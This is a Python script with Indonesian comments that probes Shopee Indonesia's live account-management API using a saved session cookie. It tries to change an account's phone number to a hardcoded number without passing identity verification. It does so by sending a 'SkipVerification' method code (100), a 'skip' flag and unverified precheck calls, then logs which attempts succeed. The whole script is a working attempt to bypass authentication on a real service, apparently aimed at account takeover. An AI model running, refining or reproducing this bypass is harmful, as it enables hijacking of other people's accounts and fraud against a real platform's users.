# -*- coding: utf-8 -*-
"""cp_skip.py — coba SkipVerification (method type 100).

Temuan dari 30.js:
  MethodNo.SkipVerification = 100
  URL mapping: O[_.SkipVerification] = ""   <-- tidak buka halaman, langsung skip

Artinya server MENGIZINKAN skip kalau kondisi terpenuhi.
Uji: kirim token/verify dengan method 100 (int) atau lewat method/select.

Juga: 10002 = IVS state invalid. Cek apakah setelah select(type=100)
state jadi valid.
"""
import json, sys, urllib.request, urllib.error, time

CKFILE = sys.argv[1] if len(sys.argv) > 1 else "ck_1659.txt"
NEWPHONE = sys.argv[2] if len(sys.argv) > 2 else "6283191104601"

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36")
ck = open(CKFILE).read().strip()
CSRF = ""
for p in ck.split(";"):
    if p.strip().startswith("csrftoken="):
        CSRF = p.split("=", 1)[1].strip()

M = "/api/v4/account/management"
st = {}


def log(*a):
    print(*a, flush=True)


def call(path, body=None, method=None):
    h = {"Cookie": ck, "User-Agent": UA, "X-API-SOURCE": "pc",
         "X-Requested-With": "XMLHttpRequest",
         "Referer": "https://shopee.co.id/user/account/settings",
         "Content-Type": "application/json", "Accept": "application/json",
         "X-CSRFToken": CSRF, "X-Shopee-Language": "id"}
    d = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request("https://shopee.co.id" + path, data=d, headers=h,
                                 method=method or ("POST" if body is not None else "GET"))
    try:
        r = urllib.request.urlopen(req, timeout=50)
        return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read())
        except Exception:
            return e.code, {}
    except Exception as ex:
        return 0, {"exc": str(ex)[:60]}


log("=== CP SKIP — coba SkipVerification ===")

# 1. init v1 + v2
s, j = call(f"{M}/change_phone_init", {})
SEQ = (j.get("data") or {}).get("seq_no")
log(f"[1] seq_no: {SEQ}")

s, j = call(f"{M}/change_phone_init_v2", {})
d2 = j.get("data") or {}
CPT = d2.get("change_phone_token")
log(f"[2] cp_token: {len(CPT or '')}B  ivs_required={d2.get('ivs_required')}")

# 3. cek state: apakah 10002 karena belum ada IVS flow?
log("\n[3] tes state SEBELUM skip")
s, j = call(f"{M}/get_password_verify_method?seq_no={SEQ}&scenario=1", None, "GET")
log(f"    get_password_verify_method: {j.get('error')}")

# 4. coba langsung precheck SETELAH init v1 (tanpa password)
log("\n[4] precheck setelah init (tanpa verify)")
for label, b in (
    ("p_seq", {"phone": NEWPHONE, "seq_no": SEQ}),
    ("p_cp", {"phone": NEWPHONE, "change_phone_token": CPT}),
    ("p_cp_seq", {"phone": NEWPHONE, "change_phone_token": CPT, "seq_no": SEQ}),
):
    s, j = call(f"{M}/change_phone_precheck_v2", b)
    log(f"    [{label:9s}] {j.get('error')} {str(j.get('data'))[:80]}")
    st.setdefault("precheck", []).append({"v": label, "err": j.get("error")})
    time.sleep(0.4)

# 5. coba verify_payment_init dengan method=100
log("\n[5] verify_payment_init method=100 (SkipVerification)")
for label, b in (
    ("m100", {"seq_no": SEQ, "scenario": 1, "method": 100}),
    ("m100s", {"seq_no": SEQ, "scenario": 1, "method": "100"}),
    ("skip", {"seq_no": SEQ, "scenario": 1, "skip": True}),
    ("m0", {"seq_no": SEQ, "scenario": 1, "method": 0}),
):
    s, j = call(f"{M}/verify_payment_init", b)
    e = j.get("error")
    mark = "★" if e != 10002 else " "
    log(f"   {mark}[{label:6s}] err={e} data={str(j.get('data'))[:90]}")
    st.setdefault("vpi", []).append({"v": label, "err": e})
    if e == 0:
        st["vpi_ok"] = {"v": label, "data": j.get("data")}
        break
    time.sleep(0.4)

# 6. get_change_phone_status — mungkin ada state server-side
log("\n[6] get_change_phone_status")
for q in ("", f"?seq_no={SEQ}", f"?change_phone_token={CPT}"):
    s, j = call(f"{M}/get_change_phone_status{q}", None, "GET")
    log(f"    q='{q[:30]}' err={j.get('error')} data={str(j.get('data'))[:110]}")
    if j.get("error") == 0:
        st["status"] = j.get("data")
    time.sleep(0.4)

# 7. cek endpoint alternatif lebih baru
log("\n[7] endpoint alternatif")
for p in ("/api/v4/account/management/get_account_security_info",
          "/api/v4/account/management/get_change_phone_info",
          "/api/v4/account/basic/get_security_settings"):
    s, j = call(p, None, "GET")
    log(f"    {p.split('/')[-1]:34s} {s} err={j.get('error')} {str(j.get('data'))[:80]}")

json.dump(st, open("cp_skip_state.json", "w"), indent=1)
log("\n=== SELESAI ===")
